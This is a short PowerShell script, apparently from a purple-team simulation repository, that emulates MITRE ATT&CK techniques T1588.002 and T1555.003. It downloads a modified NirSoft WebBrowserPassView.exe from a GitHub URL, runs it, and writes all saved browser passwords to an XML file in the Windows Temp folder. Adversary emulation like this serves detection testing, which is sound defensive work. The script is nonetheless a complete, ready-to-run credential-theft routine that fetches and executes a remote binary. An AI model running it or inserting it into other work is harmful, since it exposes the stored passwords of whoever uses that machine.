<#
    T1588.002 - Obtain Capabilities: Tool
    T1555.003 - Credentials from Password Stores: Credentials from Web Browsers
    Extract passwords from browsers with Nirsoft tool WebBrowserPassView.exe
    Download  WebBrowserPassView.exe from forked project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/WebBrowserPassView.exe and execute it 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

# Download and execute WebBrowserPassView.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/WebBrowserPassView.exe"
$dumpfile = "$env:windir\Temp\BrowserPass.xml"
$outfile = "$env:tmp\BrowserPass.exe"
try {
    Invoke-WebRequest $url -OutFile $outfile 
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: WebBrowserPassView.exe downloaded to $outfile"
        & $outfile /sxml $dumpfile
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download WebBrowserPassView.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Browser passwords extracted to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to extract Browser passwords to $dumpfile"
    }
}
catch {
    Write-Error $_
}

Stop-Transcript
